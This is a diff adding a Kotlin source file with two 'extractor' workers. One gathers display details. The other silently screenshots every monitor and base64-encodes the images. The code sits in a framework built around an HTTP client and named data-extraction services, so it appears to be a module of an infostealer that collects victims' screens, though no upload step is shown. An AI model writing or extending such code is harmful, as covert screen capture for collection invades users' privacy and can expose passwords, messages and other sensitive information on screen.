@@ -1,0 +1,49 @@
+package net.kerner.entkerner.extractors.screen
+
+import io.ktor.client.*
+import net.kerner.entkerner.abstract.AbstractDataExtractor
+import net.kerner.entkerner.abstract.SystemFileURI
+import net.kerner.entkerner.io.nullPaths
+import net.kerner.entkerner.io.toBase64
+import java.awt.GraphicsEnvironment
+import java.awt.Rectangle
+import java.awt.Robot
+import java.awt.image.BufferedImage
+import java.io.ByteArrayOutputStream
+import java.io.File
+import java.util.Base64
+import java.util.UUID
+import javax.imageio.ImageIO
+
+class ScreenExtractionWorker(ioClient: HttpClient) : AbstractDataExtractor<List<ScreenData>, List<String>>(ioClient) {
+    override val name: String = "ScreenDataExtractionService"
+    override val fileDirectories: SystemFileURI = nullPaths
+
+    override suspend fun extractData(file: File): List<ScreenData> {
+        val graphic = GraphicsEnvironment.getLocalGraphicsEnvironment()
+        return graphic.screenDevices.map { screen ->
+            ScreenData(
+                    width = screen.displayMode.width,
+                    default = GraphicsEnvironment.getLocalGraphicsEnvironment().defaultScreenDevice == screen,
+                    height = screen.displayMode.height,
+                    refreshRate = screen.displayMode.refreshRate
+            )
+        }
+    }
+}
+
+class ScreenScreenshotWorker(ioClient: HttpClient) : AbstractDataExtractor<List<BufferedImage>, List<String>>(ioClient) {
+    override val name: String = "ScreenScreenshotExtractionService"
+    override val fileDirectories: SystemFileURI = nullPaths
+
+    override suspend fun extractData(file: File): List<BufferedImage> {
+        val robot = Robot()
+        return GraphicsEnvironment.getLocalGraphicsEnvironment().screenDevices.map { screen ->
+            robot.createScreenCapture(Rectangle(screen.displayMode.width, screen.displayMode.height))
+        }
+    }
+
+    override suspend fun handleExtractedData(data: List<BufferedImage>): List<String> {
+        return data.map(BufferedImage::toBase64)
+    }
+}
